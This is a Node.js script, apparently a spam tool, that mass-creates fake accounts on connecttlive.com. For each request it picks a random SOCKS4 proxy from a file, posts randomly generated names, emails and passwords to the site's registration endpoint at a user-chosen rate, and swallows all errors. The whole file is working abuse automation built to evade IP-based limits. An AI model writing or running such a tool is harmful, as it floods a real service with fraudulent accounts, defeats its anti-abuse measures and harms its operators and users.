const request = require('request');
const prompt = require('prompt');
const ProxyAgent = require('proxy-agent');
const chalk = require('chalk');
const fs = require('fs');
process.on('uncaughtException', err => {});
process.on('unhandledRejection', err => {});
var fail = 0;
var work = 0;

function write(content, file) {
    [...new Set(fs.appendFile(file, content, function(err) {}))];
}
var proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n');
class connectt {
    static spam(times, speed) {
        let i = 0,
            int = setInterval(() => {
                if (i++ >= times) return clearInterval(int);
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new ProxyAgent('socks4://' + proxy);
                var random = Math.floor(Math.random() * 1000000);
                var password = Math.floor(Math.random() * 1000000);
                var name = Math.floor(Math.random() * 1000);
                var fullemail = random + '@' + random + '.com';
                request.post('https://connecttlive.com/users/register', {
                    agent,
                    json: true,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    form: {
                        'name': name,
                        'email': fullemail,
                        'password': password,
                        'password2': password,
                    },
                }, (err, res, body) => {
                    if (res.statusCode == 302) {
                        work++;
                        console.log(chalk.green('(%s) (%s) [Success] Created account %s:%s'), res.statusCode, work, fullemail, password);
                    } else {
                        fail++;
                        console.log(chalk.red('(%s) (%s) Failure] Failed to create an account %s:%s'), res.statusCode, fail, fullemail, password);
                    }
					  process.title = `[Connecttlive.com Acc Creator] - | Work ${work} | Fail ${fail} | Total Proxies ${proxies.length}`;
                })
            }, speed);

    }
}
prompt.start();
prompt.get(['times', 'speed'], function(err, result) {
	const times = result.times
    const speed = result.speed
    connectt.spam(times, speed);
});